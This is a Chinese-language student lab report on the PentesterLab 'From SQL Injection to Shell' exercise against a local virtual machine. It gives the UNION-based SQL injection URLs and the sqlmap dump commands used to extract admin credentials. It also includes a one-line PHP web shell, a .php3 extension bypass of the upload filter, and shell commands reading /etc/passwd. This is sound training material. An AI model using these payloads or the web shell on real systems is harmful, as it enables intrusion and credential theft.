# chap0x07 从SQL注入到Shell 实验报告

## 1、 网络设置

本次实验使用了两台虚拟机

- 靶机 网卡设置：host-only 

    - IP ：192.168.56.102

- 攻击机 网卡设置：host-only

    - IP ：192.168.56.103

## 2、 实验过程

本次实验分为以下几步进行：

1. 环境的搭建

    本次实验完全在虚拟机环境中进行，使用了两台虚拟机，一台是我之前配置好的kali虚拟机，作为本次实验的攻击机。另一台靶机从`pentesterlab`上下载的iso进行安装

    安装过程:

    1. [下载iso](https://pentesterlab.com/exercises/from_sqli_to_shell)

    2. 安装iso，使用 Liunx->Ubuntu，选择host-only模式

    3. 安装完成后，启动虚拟机，查看相关的配置，IP地址正常分配

    4. 在攻击者主机上对靶机进行访问，如果能正常访问，说明实验环境正常

- 攻击者主机、靶机的网络设置

![](img/attack_ifconfig.PNG)

![](img/SQL_ipconfig.PNG)

- 攻击者主机访问靶机,返回预期的页面

![](img/attack_webpage.PNG)

2. 攻击前侦测

- 使用nmap扫描靶机上端口开放情况,可以看到22和80端口是开启的

        nmap -A -n -T4 192.168.56.102

![](img/SQL_port.PNG)

- 尝试连接端口，telnet、nc都能检测靶机上的80端口已开启

        telnet 192.168.56.102 80

        nc 192.168.56.102 80

![](img/attack_telnet.PNG)

![](img/attack_nc.PNG)

- 对网页的网站源代码等进行分析，发现其后端可能是使用了PHP

![](img/attack_webpage1.PNG)

![](img/attack_webpage2.PNG)

- 网站内容没有再分析得到更多的东西，之后尝试使用wfuzz尝试进行爆破

        wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://192.168.56.102/FUZZ

        # -c 带颜色输出

        # -w kali自带暴力破解的字典文件，使用该文件

        # --hc 隐藏特殊响应

![](img/attack_wfuzz.PNG)

- 找到可疑的网页进行测试，修改`id=`的值，观察返回的页面信息

![](img/SQL_test0.PNG)

![](img/SQL_test3.PNG)

- 观察的时候发现,`id=2`和`id=2-1`返回的页面是不一样的，说明这个地方可能存在SQL注入点

![](img/SQL_test1.PNG)

![](img/SQL_test2.PNG)

3. 开始进行SQL注入

- 我们希望能获取到数据库的列数和列名，尝试使用`order by x`进行分析，x为阿拉伯数字

- 经过尝试之后，我们可以发现`x`为1~4的时候能正常返回图片，但为5时却返回了错误信息，说明数据库表有4列

        192.168.56.102/cat.php?id=1 order by 1
        192.168.56.102/cat.php?id=1 order by 2
        192.168.56.102/cat.php?id=1 order by 3
        192.168.56.102/cat.php?id=1 order by 4

![](img/SQL_orderby1.PNG)

![](img/SQL_orderby5.PNG)

- 根据返回的数据有四列，我们可以使用`union select 1,2,3,4`来查看返回图片名字的是哪一列，从实验结果截图中可以看出，返回了`2`。

- 则在后面的sql注入中，我们修改`2`中的信息来获取获取数据库中的其他内容

        192.168.56.102/cat.php?id=1 UNION SELECT 1,2,3,4

![](img/SQL_union1234.PNG)

- 通过前面的测试，我们已经知道了服务器会返回第二列的内容，所以通过修改`2`的值来获取数据库版本、用户信息等

        192.168.56.102/cat.php?id=1 UNION SELECT 1,current_user(),3,4

        192.168.56.102/cat.php?id=1 UNION SELECT 1,@@version,3,4

        192.168.56.102/cat.php?id=1 UNION SELECT 1,database(),3,4

![](img/SQL_user.PNG)

![](img/SQL_version.PNG)

![](img/SQL_database.PNG)

- mysql大于5.0的版本默认安装后都有INFORMATION_SCHEMA数据库。在information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。

- 我们通过尝试访问information_schema表，来查看数据库中所有表名，和表的列名

        192.168.56.102/cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables

        192.168.56.102/cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns

![](img/attack_tablename.PNG)

![](img/attack_column.PNG)

- 但为了方便把表和列进行对应，所以将其一起输出

- 得到输出结果后，`ctrl F`进行有关密码的关键词搜索，发现有相关内容，猜测其存有我们所想要获得的密码信息

        192.168.56.102/cat.php?id=1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns

![](img/attack_tablename&column.PNG)

- 在知道可能是目标的表后，想办法得到表中的数据

        192.168.56.102/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;

![](img/attack_getpassword.PNG)

- 在获取到用户名和密码后，密码是一串第一眼看上去没有任何意义的、有字母和数据组成的字符串，使用其进行登录，发现登录失败

- 猜测其为哈希值，使用在线网站尝试进行破解，得到一串有意义的字符串，再次尝试登录，登录成功，则管理员名为`admin`，密码为`P4ssw0rd`

![](img/attack_md5.PNG)

- 登录后，页面如下

![](img/attack_admin.PNG)

4. 上传webshell

- 在本地创建`.php`，文件内容如下

        <?php
        system($_GET['cmd']);
        ?>

- 尝试上传php文件到服务器端，但提示上传失败，不能直接上传PHP文件

![](img/attack_uploadphp.PNG)

- 尝试绕过检测，由于服务器配置可能存在缺陷，尝试修改文件后缀为`.php3`，这次成功上传

![](img/attack_php3.PNG)

![](img/attack_findphp3.PNG)

- 上传成功后，发现能正常执行，说明服务器有设置将`.php3`作为`.php3`来进行执行。之后即可直接用url执行cmd参数的命令

        192.168.56.102/admin/uploads/shell.php3?cmd=cat /ect/passwd

        192.168.56.102/admin/uploads/shell.php3?cmd=uname

## 3、 sqlmap注入

- kali上自带sqlmap，所以直接使用就行，使用前查看帮助信息

        sqlmap -h

![](img/sqlmap0.PNG)

- 查找服务器上的数据库相关信息

        sqlmap -u "192.168.56.101/cat.php?id=1" --dbs

![](img/sqlmap1.PNG)

- 进行表名查找

        sqlmap -u "192.168.56.101/cat.php?id=1" -D information --tables

        sqlmap -u "192.168.56.101/cat.php?id=1" -D photoblog --tables

![](img/sqlmap2.PNG)

![](img/sqlmap3.PNG)

- 发现疑似要我们目标的users表，查看users的列信息

        sqlmap -u "192.168.56.101/cat.php?id=1" -D photoblog -T photoblog --columns

![](img/sqlmap4.PNG)

- 在users表中发现疑似我们目标的password段，对users表信息进行输出

- 在输出的时候，可选择是否将hash值进行保存，是否进行hash破解，并选择破解的方式等等

- 可从结果的截图中看出，直接输出了password的明文信息

        sqlmap -u "192.168.56.101/cat.php?id=1" -D photoblog -T photoblog -C "id,login,password" --dump

![](img/sqlmap5.PNG)

## 4、 实验参考

[From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/course)

[Wfuzz 使用](https://blog.csdn.net/hardhard123/article/details/79596104)

[SQLMAP注入教程](https://www.cnblogs.com/ichunqiu/p/5805108.html)

